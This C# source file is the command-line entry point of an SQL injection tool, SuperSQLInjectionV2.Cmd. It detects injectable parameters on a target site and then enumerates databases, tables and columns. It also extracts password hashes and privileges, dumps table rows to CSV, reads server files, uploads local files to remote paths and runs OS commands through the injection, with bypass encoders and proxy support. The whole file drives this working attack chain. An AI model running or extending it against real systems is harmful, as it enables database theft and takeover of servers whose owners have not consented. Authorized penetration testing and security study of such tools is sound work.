using CommunityToolkit.Mvvm.Messaging;
using SuperSQLInjectionV2.Bypass;
using SuperSQLInjectionV2.Models;
using SuperSQLInjectionV2.Models.Data;
using SuperSQLInjectionV2.Msg;
using SuperSQLInjectionV2.Payload;
using SuperSQLInjectionV2.Tools;
using SuperSQLInjectionV2.Tools.Http;
using SuperSQLInjectionV2.Tools.Inject;
using SuperSQLInjectionV2.ViewModels;
using SuperSQLInjectionV2.ViewModels.Tools;
using System.Collections.ObjectModel;
using System.Reflection;
using System.Text;

namespace SuperSQLInjectionV2.Cmd;

/// <summary>
/// SuperSQLInjectionV2.Cmd — SuperSQLInjectionV2 命令行版入口。
/// 复用主库检测引擎（InjectDetectEngine）与取数链路（DataComm/PayloadFactory/VersTools/DataTools/FileCmdTools），
/// 日志经 ConsoleLogSink 输出，全程无 UI 依赖。
/// </summary>
public static class Program
{
    /// <summary>版本号（ConstData 为 internal，CLI 读程序集信息版本）</summary>
    public static string AppVersion =>
        Assembly.GetExecutingAssembly().GetCustomAttribute<AssemblyInformationalVersionAttribute>()?.InformationalVersion ?? "2.0.0";

    /// <summary>--selftest 探针：自定义 JS 项强制走 QuickJS 池化执行（非内置 C# 委托），验证原生库加载与 eval 链路</summary>
    private sealed class SelfTestTamper : ITamperItem
    {
        public string Name => "selftest";
        public bool Builtin => false;
        public string? Key => null;
        public string? Code => "function tamper(p){ return 'qjs:' + p + ':' + (1+1); }";
    }

    public static async Task<int> Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;
        LogTools.Headless = true;
        Log.Sink = new ConsoleLogSink();

        CliOptions opt;
        try
        {
            opt = CliOptions.Parse(args);
        }
        catch (ArgumentException e)
        {
            Console.Error.WriteLine("参数错误: " + e.Message);
            Console.Error.WriteLine("用 -h 查看帮助");
            return 2;
        }

        if (opt.ShowVersion)
        {
            Console.WriteLine("SuperSQLInjectionV2.Cmd v" + AppVersion);
            return 0;
        }

        if (opt.SelfTest)
        {
            // 自检：真实加载 libquickjs 原生库并执行一段 JS（--version 不触碰 QuickJS，CI 冒烟需覆盖原生库加载链路）
            try
            {
                string r = ScriptTamperEngine.TamperStrict(new SelfTestTamper(), "ok");
                if (r == "qjs:ok:2")
                {
                    Console.WriteLine("selftest: QuickJS OK (" + r + ")");
                    return 0;
                }
                Console.Error.WriteLine("selftest: QuickJS 返回不符预期: " + r);
                return 1;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("selftest: QuickJS 加载/执行失败: " + e.Message);
                return 1;
            }
        }
        if (opt.ShowHelp || args.Length == 0)
        {
            Console.WriteLine(CliOptions.HelpText);
            return args.Length == 0 && !opt.ShowHelp ? 2 : 0;
        }
        if (string.IsNullOrWhiteSpace(opt.Url) && string.IsNullOrWhiteSpace(opt.RequestFile))
        {
            Console.Error.WriteLine("缺少目标：用 -u 指定 URL 或 -r 指定请求报文文件");
            return 2;
        }

        try
        {
            return await Run(opt);
        }
        catch (Exception e)
        {
            Log.Error("运行异常: " + e.Message);
            return 3;
        }
    }

    private static async Task<int> Run(CliOptions opt)
    {
        // ---------- 配置 ----------
        var config = new AppConfig
        {
            TimeOut = opt.Timeout,
            RetryCount = opt.Retries,
            ThreadSize = Math.Clamp(opt.Threads, 1, 20),
            FollowRedirect = opt.FollowRedirects
        };
        config.ByPassConfig.DelayMs = opt.DelayMs;
        config.ByPassConfig.RandomUa = opt.RandomAgent;
        config.DataConfig.DetectLevel = Math.Clamp(opt.Level, 1, 5);
        config.DataConfig.DetectRisk = Math.Clamp(opt.Risk, 1, 3);
        config.DataConfig.SmartMode = opt.Smart;
        config.DataConfig.DetectExhaustive = opt.Exhaustive;
        config.DataConfig.HexDecode = opt.HexDecode;
        config.DataDump.DumpNoCast = opt.NoCast;
        if (!string.IsNullOrWhiteSpace(opt.Where)) config.DataDump.DumpWhere = opt.Where!;
        if (!string.IsNullOrWhiteSpace(opt.DnsDomain))
        {
            config.DataConfig.DetectDnsOob = true;
            config.DataConfig.DnsLogDomain = opt.DnsDomain!;
            if (!string.IsNullOrWhiteSpace(opt.DnsToken)) config.DataConfig.DnsLogApiToken = opt.DnsToken!;
        }

        // ---------- 请求报文 ----------
        string requestTxt;
        ParamPlace defaultPlace = ParamPlace.Query;
        if (!string.IsNullOrWhiteSpace(opt.RequestFile))
        {
            if (!File.Exists(opt.RequestFile)) { Log.Error("请求报文文件不存在: " + opt.RequestFile); return 2; }
            requestTxt = File.ReadAllText(opt.RequestFile).Replace("\r\n", "\n", StringComparison.Ordinal).Replace("\n", "\r\n", StringComparison.Ordinal);
            ApplyHostFromRequest(config, requestTxt);
        }
        else
        {
            requestTxt = BuildRequestFromUrl(config, opt);
            if (!string.IsNullOrWhiteSpace(opt.Data)) defaultPlace = ParamPlace.BodyForm;
        }

        // tamper 编码处理链
        if (!string.IsNullOrWhiteSpace(opt.Tamper)) ApplyTamper(config, opt.Tamper!);
        if (!string.IsNullOrWhiteSpace(opt.Proxy)) ApplyProxy(config, opt.Proxy!);

        Log.Highlight($"目标: {config.Host}:{config.Port}{(config.IsSSL ? " (SSL)" : "")}");
        Log.Show($"检测配置: Level={config.DataConfig.DetectLevel} Risk={config.DataConfig.DetectRisk}" +
                 $"{(opt.Smart ? " Smart" : "")}{(string.IsNullOrWhiteSpace(opt.Technique) ? "" : " Technique=" + opt.Technique)}");

        // ---------- 参数发现 ----------
        var candidates = DiscoverParams(requestTxt, defaultPlace, opt);
        if (candidates.Count == 0)
        {
            Log.Error("未发现可测试参数（用 -p 指定，或检查 URL/报文是否带参数）");
            return 2;
        }
        Log.Show($"待检测参数: {string.Join(", ", candidates.Select(c => c.Name + "(" + c.Place + ")"))}");

        // ---------- 注入检测 ----------
        var allHits = new List<InjectPoint>();
        foreach (var (name, value, place, header) in candidates)
        {
            Log.Highlight($"▶ 检测参数 {name} ...");
            var hits = await InjectDetectEngine.DetectParam(config, requestTxt, name, value, place, header) ?? [];
            if (hits.Count > 0)
            {
                foreach (var h in hits) h.PName ??= name;
                allHits.AddRange(hits);
                Log.Success($"参数 {name} 检出 {hits.Count} 个注入类型");
            }
            else
            {
                Log.Show($"参数 {name} 未检出注入");
            }
        }

        // --technique 过滤
        if (!string.IsNullOrWhiteSpace(opt.Technique))
        {
            var allow = opt.Technique!.Select(LetterToType).Where(t => t != InjectType.UnKnow).ToHashSet();
            allHits = allHits.Where(h => allow.Contains(h.InjectType)).ToList();
        }

        if (allHits.Count == 0)
        {
            Log.Warning("未发现注入点。可提高 --level/--risk，或加 --smart 之外换个参数试试");
            return 1;
        }

        // ---------- 检测报告 ----------
        Console.WriteLine();
        Log.Success("========== 注入检测报告 ==========");
        foreach (var h in allHits)
        {
            Console.WriteLine($"  参数: {h.PName}  类型: {TypeName(h)}  数据库: {h.DBType}" +
                              (h.InjectType == InjectType.Union ? $"  列数: {h.SumColumnCount} 显示位: {h.ShowColumnIndex}" : "") +
                              (h.InjectType == InjectType.Blind ? $"  判断: {h.BoolInjectType}" : ""));
        }
        SaveSession(opt, config, allHits);

        if (!opt.HasAction)
        {
            Log.Show("未指定取数动作（--dbs/--tables/--dump/--sql-query 等），检测结束");
            return 0;
        }

        // ---------- 选择注入点并应用 ----------
        InjectPoint best = PickBest(allHits, opt);
        Log.Highlight($"采用注入点: {best.PName}（{TypeName(best)}，{best.DBType}）");
        foreach (var h in allHits)
        {
            InjectChannelRegistry.Register(config.Host, config.Port, new InjectRecord
            {
                Target = config.Host + ":" + config.Port,
                PName = h.PName ?? "",
                DBType = h.DBType,
                InjectType = h.InjectType,
                BoolInjectType = h.BoolInjectType,
                CheckValue = h.CheckValue ?? "",
                Revers = h.Revers,
                SumColumnCount = h.SumColumnCount,
                ShowColumnIndex = h.ShowColumnIndex,
                RequestTxt = h.RequestTxt ?? ""
            });
        }
        ApplyHit(config, best);
        DBType dbType = best.DBType;
        if (dbType == DBType.UnKnow && !string.IsNullOrWhiteSpace(opt.Dbms))
        {
            dbType = ParseDbms(opt.Dbms!);
            config.DataConfig.SelectedDBType = dbType;
        }
        if (dbType == DBType.UnKnow)
        {
            Log.Error("未识别数据库类型，用 --dbms 指定后重试取数");
            return 1;
        }
        PayloadFactory.Init(dbType);
        if (!string.IsNullOrWhiteSpace(opt.Dbms) && best.DBType != dbType)
            Log.Show($"--dbms 指定: {dbType}");

        // ---------- 执行动作 ----------
        await RunActions(opt, config, dbType, best);
        return 0;
    }

    // ================== 动作执行 ==================

    private static async Task RunActions(CliOptions opt, AppConfig config, DBType dbType, InjectPoint hit)
    {
        bool echo = hit.InjectType is InjectType.Union or InjectType.Error;

        async Task<string> GetData(string expr, int maxLen = 1024) => (hit.InjectType switch
        {
            InjectType.Union => await DataComm.DataDumpWithNoFrom(config, expr),
            InjectType.Error => await DataComm.DataDumpWithError(config, expr),
            InjectType.Stacked => await DataComm.GetStringByStacked(config, expr, maxLen),
            _ => await DataComm.GetStringByBool(config, expr, maxLen)
        }) ?? "";
        async Task<int> GetCount(string expr)
        {
            if (echo) { string v = await GetData(expr, 64); return int.TryParse((v ?? "").Trim(), out int n) ? n : -1; }
            return await DataComm.GetValueLen(config, expr, 0, 65535);
        }

        // ---- 环境变量类 ----
        if (opt.Banner || opt.CurrentUser || opt.CurrentDb || opt.Hostname || opt.IsDba || opt.AllEnv || opt.Passwords || opt.Privileges)
        {
            var vers = new ObservableCollection<VersModel>();
            var hash = new ObservableCollection<VersModel>();
            var priv = new ObservableCollection<VersModel>();
            VersTools.ReadVersByDBType(dbType, vers, hash, priv);
            IEnumerable<VersModel> picked;
            if (opt.AllEnv) picked = vers;
            else
            {
                var list = new List<VersModel>();
                void Pick(IEnumerable<VersModel> src, params string[] keys) =>
                    list.AddRange(src.Where(v => keys.Any(k => v.Name.Contains(k, StringComparison.OrdinalIgnoreCase))));
                if (opt.Banner) Pick(vers, "版本", "version()", "banner");
                if (opt.CurrentUser) Pick(vers, "用户", "user()");
                if (opt.CurrentDb) Pick(vers, "当前库", "当前数据", "database");
                if (opt.Hostname) Pick(vers, "主机", "host");
                if (opt.IsDba) Pick(hash, "DBA");
                if (opt.Passwords) list.AddRange(hash.Where(h => !list.Contains(h)));
                if (opt.Privileges) list.AddRange(priv);
                picked = list.Distinct();
            }
            Console.WriteLine();
            Log.Highlight("========== 环境信息 ==========");
            if (!picked.Any())
            {
                Log.Warning($"当前数据库 {dbType} 的环境变量模板中没有匹配所选项的条目（可试 --env 读取全部）");
            }
            foreach (var item in picked)
            {
                config.CheckStop();
                string v = await GetData(item.VerPayload);
                Console.WriteLine($"  {item.Name}: {v}");
            }
        }

        // ---- 枚举库 ----
        if (opt.Dbs)
        {
            Console.WriteLine();
            Log.Highlight("========== 数据库列表 ==========");
            var dbs = await EnumerateNames(config, hit, GetData, GetCount,
                PayloadFactory.BasePayload.DBCount,
                PayloadFactory.BasePayload.DBNames,
                i => PayloadFactory.BPTool.GetDBName(i));
            foreach (var d in dbs) Console.WriteLine("  " + d);
            Log.Success($"共 {dbs.Count} 个库");
        }

        // ---- 枚举表 ----
        if (opt.Tables)
        {
            string db = RequireDb(opt, "--tables");
            Console.WriteLine();
            Log.Highlight($"========== 表列表（{db}） ==========");
            var tables = await EnumerateNames(config, hit, GetData, GetCount,
                PayloadFactory.BPTool.GetTableCount(db),
                PayloadFactory.BPTool.GetTableNames(db),
                i => PayloadFactory.BPTool.GetTableName(db, i));
            foreach (var t in tables) Console.WriteLine("  " + t);
            Log.Success($"共 {tables.Count} 张表");
        }

        // ---- 枚举字段 ----
        List<string>? dumpCols = null;
        if (opt.Columns || (opt.Dump && string.IsNullOrWhiteSpace(opt.ColumnList)))
        {
            string db = RequireDb(opt, "--columns");
            string table = RequireTable(opt, "--columns");
            if (opt.Columns)
            {
                Console.WriteLine();
                Log.Highlight($"========== 字段列表（{db}.{table}） ==========");
            }
            dumpCols = await EnumerateNames(config, hit, GetData, GetCount,
                PayloadFactory.BPTool.GetColumnCount(db, table),
                PayloadFactory.BPTool.GetColumnNames(db, table),
                i => PayloadFactory.BPTool.GetColumnName(db, table, i));
            if (opt.Columns)
            {
                foreach (var c in dumpCols) Console.WriteLine("  " + c);
                Log.Success($"共 {dumpCols.Count} 个字段");
            }
            else
            {
                Log.Show($"字段枚举: {string.Join(", ", dumpCols)}");
            }
        }

        // ---- dump ----
        if (opt.Dump)
        {
            string db = RequireDb(opt, "--dump");
            string table = RequireTable(opt, "--dump");
            List<string> cols = !string.IsNullOrWhiteSpace(opt.ColumnList)
                ? opt.ColumnList!.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).ToList
                (): dumpCols ?? [];
            if (cols.Count == 0)
            {
                Log.Error("dump 需要列：用 -C 指定，或先 --columns 枚举");
                return;
            }
            config.DataDump.DataDumpStart = Math.Max(0, opt.Start - 1);
            config.DataDump.DumpCount = opt.Stop ?? 0; // 0 时由行数检查兜底
            Console.WriteLine();
            Log.Highlight($"========== 导出数据（{db}.{table}，列: {string.Join(",", cols)}） ==========");

            var rows = new List<DynamicDataItem>();
            WeakReferenceMessenger.Default.Register<List<DynamicDataItem>, AddRowDataMsg>(rows, (r, m) => r.Add(m.Data));

            var dt = new DataTools(db, table, cols);
            // DumpCount=0 时先取行数兜底
            if (config.DataDump.DumpCount <= 0)
            {
                int cnt = await GetCount(PayloadFactory.BPTool.GetDataCount(db, table, config.DataDump.DumpWhere));
                config.DataDump.DumpCount = cnt;
                Log.Show($"表 {table} 共 {cnt} 行");
            }
            Task dumpTask = hit.InjectType switch
            {
                InjectType.Union => dt.GetDataUnion(config),
                InjectType.Error => dt.GetDataError(config),
                _ => dt.GetDataByBool(config)
            };
            await dumpTask;
            WeakReferenceMessenger.Default.Unregister<AddRowDataMsg>(rows);

            PrintTable(cols, rows);
            SaveDumpCsv(opt, config, db, table, cols, rows);
        }

        // ---- 自定义 SQL ----
        if (opt.SqlQuery != null)
        {
            Console.WriteLine();
            Log.Highlight("========== 自定义 SQL ==========");
            Console.WriteLine("  " + opt.SqlQuery);
            string result = await DataComm.RunUserSql(config, opt.SqlQuery);
            Console.WriteLine("结果: " + result);
        }

        // ---- 文件读取 ----
        if (opt.FileRead != null)
        {
            Console.WriteLine();
            Log.Highlight($"========== 读取文件: {opt.FileRead} ==========");
            var vm = new FileCmdViewModel(config);
            vm.RefreshFileMethods(dbType);
            string? method = vm.FileMethods.FirstOrDefault(m => m.Contains("读文件", StringComparison.Ordinal));
            if (method == null) { Log.Error($"当前数据库 {dbType} 不支持文件读取"); }
            else
            {
                vm.SelectedFileMethod = method;
                vm.FilePath = opt.FileRead;
                Log.Show($"方式: {method}");
                await FileCmdTools.ExecuteFile(config, vm);
                if (!string.IsNullOrEmpty(vm.FileContent)) Console.WriteLine(vm.FileContent);
            }
        }

        // ---- 文件上传 ----
        if (opt.FileWrite != null)
        {
            if (!File.Exists(opt.FileWrite)) { Log.Error("本地文件不存在: " + opt.FileWrite); return; }
            if (string.IsNullOrWhiteSpace(opt.FileDest)) { Log.Error("--file-write 需要配合 --file-dest 指定远端路径"); return; }
            Console.WriteLine();
            Log.Highlight($"========== 上传文件: {opt.FileWrite} → {opt.FileDest} ==========");
            var vm = new FileCmdViewModel(config);
            vm.RefreshFileMethods(dbType);
            string? method = vm.FileMethods.FirstOrDefault(m => m.Contains("写文件", StringComparison.Ordinal));
            if (method == null) { Log.Error($"当前数据库 {dbType} 不支持文件写入"); }
            else
            {
                vm.SelectedFileMethod = method;
                vm.FilePath = opt.FileDest!;
                vm.FileContent = File.ReadAllText(opt.FileWrite);
                Log.Show($"方式: {method}");
                await FileCmdTools.ExecuteFile(config, vm);
            }
        }

        // ---- 命令执行 ----
        if (opt.OsCmd != null)
        {
            Console.WriteLine();
            Log.Highlight($"========== 命令执行: {opt.OsCmd} ==========");
            var vm = new FileCmdViewModel(config);
            vm.RefreshFileMethods(dbType);
            if (vm.CmdMethods.Count == 0) { Log.Error($"当前数据库 {dbType} 不支持命令执行（{vm.CmdMethodHint}）"); }
            else
            {
                vm.SelectedCmdMethod = vm.CmdMethods[0];
                vm.CmdText = opt.OsCmd;
                vm.CmdShowResult = true;
                vm.CmdSessionMode = false;
                Log.Show($"方式: {vm.SelectedCmdMethod}");
                await FileCmdTools.ExecuteCmd(config, vm);
                if (!string.IsNullOrEmpty(vm.CmdResult)) Console.WriteLine(vm.CmdResult);
            }
        }
    }

    // ================== 枚举（三通道） ==================

    private static async Task<List<string>> EnumerateNames(AppConfig config, InjectPoint hit,
        Func<string, int, Task<string>> getData, Func<string, Task<int>> getCount,
        string countPayload, string namesPayload, Func<int, string> nameAt)
    {
        bool echo = hit.InjectType is InjectType.Union or InjectType.Error;
        if (echo && !string.IsNullOrWhiteSpace(namesPayload))
        {
            //聚合一次取回，空则回退逐行
            string agg = await getData(namesPayload, 4096);
            var items = (agg ?? "").Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).ToList();
            if (items.Count > 0) return items;
            Log.Warning("聚合取回为空（可能被截断），回退逐行读取");
        }
        int count = await getCount(countPayload);
        if (count <= 0) return [];
        var names = new List<string>(count);
        for (int i = 0; i < count; i++)
        {
            config.CheckStop();
            string name = await getData(nameAt(i), 256);
            if (string.IsNullOrEmpty(name)) break;
            names.Add(name);
            Log.Show($"  [{i + 1}/{count}] {name}");
        }
        return names;
    }

    // ================== 注入点选择/应用 ==================

    private static InjectPoint PickBest(List<InjectPoint> hits, CliOptions opt)
    {
        if (!string.IsNullOrWhiteSpace(opt.Technique))
        {
            foreach (char c in opt.Technique!)
            {
                var t = LetterToType(c);
                var h = hits.FirstOrDefault(x => x.InjectType == t);
                if (h != null) return h;
            }
        }
        //默认优先级：Union > Error > 时间盲注 > Bool盲注 > 堆叠 > DNS
        return hits.FirstOrDefault(h => h.InjectType == InjectType.Union)
            ?? hits.FirstOrDefault(h => h.InjectType == InjectType.Error)
            ?? hits.FirstOrDefault(h => h.InjectType == InjectType.Time)
            ?? hits.FirstOrDefault(h => h.InjectType == InjectType.Blind)
            ?? hits[^1];
    }

    private static InjectType LetterToType(char c) => char.ToUpperInvariant(c) switch
    {
        'B' => InjectType.Blind,
        'E' => InjectType.Error,
        'U' => InjectType.Union,
        'T' => InjectType.Time,
        'S' => InjectType.Stacked,
        'D' => InjectType.Dns,
        _ => InjectType.UnKnow
    };

    private static string TypeName(InjectPoint h) => h.InjectType switch
    {
        InjectType.Blind => $"Bool盲注({h.BoolInjectType})",
        InjectType.Time => "时间盲注",
        InjectType.Error => "报错注入",
        InjectType.Union => "Union注入",
        InjectType.Stacked => "堆叠注入",
        InjectType.Dns => "DNS盲注",
        _ => h.InjectType.ToString()
    };

    private static void ApplyHit(AppConfig config, InjectPoint best)
    {
        config.DataConfig.SelectedInjectType = best.InjectType;
        config.DataConfig.InjectParamName = best.PName ?? "";
        if (best.InjectType == InjectType.Blind || best.InjectType == InjectType.Time)
        {
            config.DataConfig.SelectBoolInject = best.BoolInjectType;
            config.DataConfig.CheckValue = best.CheckValue;
            config.DataConfig.Reverse = best.Revers;
        }
        if (best.InjectType == InjectType.Union)
        {
            config.DataConfig.SumColumnCount = best.SumColumnCount;
            config.DataConfig.ShowColumnIndex = best.ShowColumnIndex;
        }
        config.DataConfig.TrueCode = best.TrueCode;
        config.DataConfig.FalseCode = best.FalseCode;
        config.DataConfig.SawUnexpectedCode = false;
        config.RequestTxt = best.RequestTxt;
        //检测期自动适配的编码工具随注入点恢复
        if (!string.IsNullOrEmpty(best.AutoTamper))
        {
            var item = config.ByPassConfig.EncodeTools.FirstOrDefault(s =>
                string.Equals(s.Key, best.AutoTamper, StringComparison.OrdinalIgnoreCase)
                || string.Equals(s.Name, best.AutoTamper, StringComparison.OrdinalIgnoreCase));
            if (item == null)
            {
                var found = ScriptTamperEngine.FindBuiltinScript(best.AutoTamper);
                if (found != null)
                {
                    item = new EncodeToolModel { Name = found.Name, Key = found.Key, Scope = ScriptScope.Payload, Builtin = true, Enable = false };
                    config.ByPassConfig.EncodeTools.Add(item);
                }
            }
            if (item != null)
            {
                item.Enable = true;
                Log.Show($"检测期绕过已恢复: {best.AutoTamper}");
            }
        }
    }

    private static DBType ParseDbms(string s)
    {
        s = s.Trim().ToLowerInvariant();
        return s switch
        {
            "mysql" => DBType.MySQL,
            "pgsql" or "postgresql" => DBType.PostgreSQL,
            "sqlserver" or "mssql" => DBType.SQLServer,
            "sqlite" => DBType.SQLite,
            "oracle" => DBType.Oracle,
            "access" => DBType.Access,
            "dm" => DBType.DM,
            "kingbase" => DBType.Kingbase,
            "h2" => DBType.H2,
            "hsqldb" => DBType.HSQLDB,
            "opengauss" => DBType.OpenGauss,
            "db2" => DBType.DB2,
            "clickhouse" => DBType.ClickHouse,
            _ => Enum.TryParse<DBType>(s, true, out var t) ? t : DBType.UnKnow
        };
    }

    // ================== 目标/参数处理 ==================

    private static string BuildRequestFromUrl(AppConfig config, CliOptions opt)
    {
        var uri = new Uri(opt.Url!);
        config.Host = uri.Host;
        config.Port = uri.Port > 0 ? uri.Port : (uri.Scheme == "https" ? 443 : 80);
        config.IsSSL = uri.Scheme == "https";

        string path = string.IsNullOrEmpty(uri.PathAndQuery) ? "/" : uri.PathAndQuery;
        string ua = opt.UserAgent ?? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SuperSQLInjectionV2.Cmd/" + AppVersion;
        string method = opt.Method ?? (string.IsNullOrEmpty(opt.Data) ? "GET" : "POST");

        var sb = new StringBuilder();
        sb.Append($"{method} {path} HTTP/1.1\r\n");
        sb.Append($"Host: {uri.Host}{(uri.IsDefaultPort ? "" : ":" + config.Port)}\r\n");
        sb.Append($"User-Agent: {ua}\r\n");
        sb.Append("Accept: */*\r\n");
        if (!string.IsNullOrWhiteSpace(opt.Cookie)) sb.Append($"Cookie: {opt.Cookie}\r\n");
        foreach (var h in opt.Headers) sb.Append(h.Replace("\r", "", StringComparison.Ordinal).Replace("\n", "", StringComparison.Ordinal) + "\r\n");
        if (!string.IsNullOrEmpty(opt.Data))
        {
            sb.Append("Content-Type: application/x-www-form-urlencoded\r\n");
            sb.Append($"Content-Length: {Encoding.UTF8.GetByteCount(opt.Data)}\r\n");
        }
        sb.Append("Connection: close\r\n\r\n");
        if (!string.IsNullOrEmpty(opt.Data)) sb.Append(opt.Data);
        return sb.ToString();
    }

    private static void ApplyHostFromRequest(AppConfig config, string requestTxt)
    {
        var hostLine = requestTxt.Split("\r\n").FirstOrDefault(l => l.StartsWith("Host:", StringComparison.OrdinalIgnoreCase));
        if (hostLine == null) throw new ArgumentException("请求报文缺少 Host 头");
        string hostPort = hostLine[5..].Trim();
        if (hostPort.Contains(':', StringComparison.Ordinal))
        {
            config.Host = hostPort.Split(':')[0];
            config.Port = int.Parse(hostPort.Split(':')[1]);
        }
        else
        {
            config.Host = hostPort;
            config.Port = 80;
        }
    }

    /// <summary>从请求报文发现可测参数：Query / POST表单；-p 指定时只保留该参数</summary>
    private static List<(string Name, string Value, ParamPlace Place, string Header)> DiscoverParams(
        string requestTxt, ParamPlace bodyPlace, CliOptions opt)
    {
        var list = new List<(string, string, ParamPlace, string)>();
        string firstLine = requestTxt.Split("\r\n")[0];
        var parts = firstLine.Split(' ');
        if (parts.Length >= 2)
        {
            int q = parts[1].IndexOf('?', StringComparison.Ordinal);
            if (q >= 0)
            {
                foreach (var kv in parts[1][(q + 1)..].Split('&', StringSplitOptions.RemoveEmptyEntries))
                {
                    int eq = kv.IndexOf('=', StringComparison.Ordinal);
                    string name = eq >= 0 ? kv[..eq] : kv;
                    string value = eq >= 0 ? kv[(eq + 1)..] : "";
                    list.Add((Uri.UnescapeDataString(name), value, ParamPlace.Query, ""));
                }
            }
        }
        //POST 表单体
        int bodyIdx = requestTxt.IndexOf("\r\n\r\n", StringComparison.Ordinal);
        if (bodyIdx >= 0)
        {
            string body = requestTxt[(bodyIdx + 4)..];
            if (body.Contains('=', StringComparison.Ordinal) && !body.TrimStart().StartsWith('{') && !body.TrimStart().StartsWith('<'))
            {
                foreach (var kv in body.Split('&', StringSplitOptions.RemoveEmptyEntries))
                {
                    int eq = kv.IndexOf('=', StringComparison.Ordinal);
                    string name = eq >= 0 ? kv[..eq] : kv;
                    string value = eq >= 0 ? kv[(eq + 1)..] : "";
                    if (name.Length > 0) list.Add((Uri.UnescapeDataString(name), value, ParamPlace.BodyForm, ""));
                }
            }
        }
        if (!string.IsNullOrWhiteSpace(opt.TestParam))
        {
            list = list.Where(x => string.Equals(x.Item1, opt.TestParam, StringComparison.OrdinalIgnoreCase)).ToList();
            if (list.Count == 0)
            {
                //-p 指定但报文里没有：按默认位置加入（值取 "1"）
                list.Add((opt.TestParam!, "1", bodyPlace, ""));
            }
        }
        return list;
    }

    private static void ApplyTamper(AppConfig config, string tamper)
    {
        foreach (var name in tamper.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries))
        {
            var item = config.ByPassConfig.EncodeTools.FirstOrDefault(s =>
                string.Equals(s.Key, name, StringComparison.OrdinalIgnoreCase)
                || string.Equals(s.Name, name, StringComparison.OrdinalIgnoreCase));
            if (item == null)
            {
                var found = ScriptTamperEngine.FindBuiltinScript(name);
                if (found != null)
                    item = new EncodeToolModel { Name = found.Name, Key = found.Key, Scope = ScriptScope.Payload, Builtin = true };
            }
            if (item == null)
            {
                Log.Warning($"编码工具未找到: {name}（已忽略）");
                continue;
            }
            if (!config.ByPassConfig.EncodeTools.Contains(item)) config.ByPassConfig.EncodeTools.Add(item);
            item.Enable = true;
            Log.Show($"编码处理启用: {item.Name}");
        }
    }

    private static void ApplyProxy(AppConfig config, string proxy)
    {
        try
        {
            var uri = new Uri(proxy);
            config.ProxyConfig.ProxyEnable = true;
            config.ProxyConfig.SelectProxyType = ProxyType.Fixed;
            config.ProxyConfig.AddProxy = new Proxy
            {
                Host = uri.Host,
                Port = uri.Port > 0 ? uri.Port : 8080,
                proxyType = uri.Scheme.Equals("socks5", StringComparison.OrdinalIgnoreCase) ? "socks5" : "HTTP/HTTPS"
            };
            Log.Show($"代理: {uri.Scheme}://{uri.Host}:{uri.Port}");
        }
        catch (Exception e)
        {
            Log.Warning("代理地址解析失败（已忽略）: " + e.Message);
        }
    }

    private static string RequireDb(CliOptions opt, string action)
    {
        if (string.IsNullOrWhiteSpace(opt.Db)) throw new ArgumentException($"{action} 需要 -D 指定数据库名");
        return opt.Db!;
    }

    private static string RequireTable(CliOptions opt, string action)
    {
        if (string.IsNullOrWhiteSpace(opt.Table)) throw new ArgumentException($"{action} 需要 -T 指定表名");
        return opt.Table!;
    }

    // ================== 输出 ==================

    private static void PrintTable(List<string> cols, List<DynamicDataItem> rows)
    {
        var widths = cols.Select((c, i) => Math.Max(c.Length, rows.Select(r => DisplayWidth(r[c])).DefaultIfEmpty(0).Max())).ToArray();
        string Sep() => "+" + string.Join("+", widths.Select(w => new string('-', w + 2))) + "+";
        Console.WriteLine(Sep());
        Console.WriteLine("|" + string.Join("|", cols.Select((c, i) => " " + c.PadRight(widths[i]) + " ")) + "|");
        Console.WriteLine(Sep());
        foreach (var r in rows)
        {
            Console.WriteLine("|" + string.Join("|", cols.Select((c, i) => " " + PadDisplay(r[c], widths[i]) + " ")) + "|");
        }
        Console.WriteLine(Sep());
        Log.Success($"共 {rows.Count} 行");
    }

    private static int DisplayWidth(string s) => s.Sum(ch => ch > 0xFF ? 2 : 1);
    private static string PadDisplay(string s, int width) => s + new string(' ', Math.Max(0, width - DisplayWidth(s)));

    private static string OutputRoot(CliOptions opt, AppConfig config)
    {
        string dir = opt.OutputDir ?? Path.Combine("output", $"{config.Host}_{config.Port}");
        Directory.CreateDirectory(dir);
        return dir;
    }

    private static void SaveSession(CliOptions opt, AppConfig config, List<InjectPoint> hits)
    {
        try
        {
            string dir = OutputRoot(opt, config);
            string file = Path.Combine(dir, "session.json");
            // AOT 下禁用反射序列化，手写 JSON（字段固定）
            var sb = new StringBuilder("[");
            bool first = true;
            foreach (var h in hits)
            {
                if (!first) sb.Append(',');
                first = false;
                sb.Append("\n  {")
                  .Append("\"PName\":").Append(JsonStr(h.PName)).Append(',')
                  .Append("\"DBType\":\"").Append(h.DBType).Append("\",")
                  .Append("\"InjectType\":\"").Append(h.InjectType).Append("\",")
                  .Append("\"BoolInjectType\":\"").Append(h.BoolInjectType).Append("\",")
                  .Append("\"CheckValue\":").Append(JsonStr(h.CheckValue)).Append(',')
                  .Append("\"Revers\":").Append(h.Revers ? "true" : "false").Append(',')
                  .Append("\"SumColumnCount\":").Append(h.SumColumnCount).Append(',')
                  .Append("\"ShowColumnIndex\":").Append(h.ShowColumnIndex).Append(',')
                  .Append("\"Place\":\"").Append(h.Place).Append("\",")
                  .Append("\"TrueCode\":").Append(h.TrueCode).Append(',')
                  .Append("\"FalseCode\":").Append(h.FalseCode)
                  .Append('}');
            }
            sb.Append("\n]\n");
            File.WriteAllText(file, sb.ToString());
            Log.Show($"检测会话已保存: {file}");
        }
        catch (Exception e)
        {
            Log.Warning("会话保存失败（不影响结果）: " + e.Message);
        }
    }

    private static void SaveDumpCsv(CliOptions opt, AppConfig config, string db, string table, List<string> cols, List<DynamicDataItem> rows)
    {
        try
        {
            string dir = OutputRoot(opt, config);
            string file = Path.Combine(dir, $"dump_{db}_{table}_{DateTime.Now:yyyyMMdd_HHmmss}.csv");
            var sb = new StringBuilder();
            sb.AppendLine(string.Join(",", cols.Select(CsvEscape)));
            foreach (var r in rows) sb.AppendLine(string.Join(",", cols.Select(c => CsvEscape(r[c]))));
            File.WriteAllText(file, sb.ToString(), Encoding.UTF8);
            Log.Success($"dump 已保存: {file}");
        }
        catch (Exception e)
        {
            Log.Warning("dump 保存失败（不影响结果）: " + e.Message);
        }
    }

